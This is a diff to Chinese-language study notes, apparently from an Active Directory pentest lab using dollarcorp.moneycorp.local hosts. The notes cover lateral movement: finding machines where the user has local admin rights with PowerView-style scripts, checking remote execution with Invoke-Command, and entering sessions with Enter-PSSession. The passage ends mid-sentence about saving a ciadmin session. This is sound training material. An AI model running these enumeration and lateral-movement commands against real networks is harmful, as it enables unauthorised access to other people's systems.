@@ -1,12 +1,26 @@
+# 查找本地管理员可以用powershell远程登录的电脑
+```
+PS C:\AD> . .\Find-PSRemotingLocalAdminAccess.ps1
+PS C:\AD> Find-PSRemotingLocalAdminAccess
+```
+或者用powerview
+```
+Find-LocalAdminAccess
+```
+
+
+# 有LocalAdmin权限的，可以用以下命令在对方机器执行验证
+```
+Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt
+```
+
 # 横向移动到指定电脑
 ```
 Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
+
+Enter-PSSession dcorp-adminsrv.dollarcorp.moneycorp.local # 也可以不要参数
 ```
 
-# 也可以不要参数
-```
-Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
-```
 
 # 获取一个登陆的session，以便根据session指定操作
 账号ciadmin可以横向登录到计算机dcorp-mgmt.dollarcorp.moneycorp.local，我们把登录的session保存在$sess
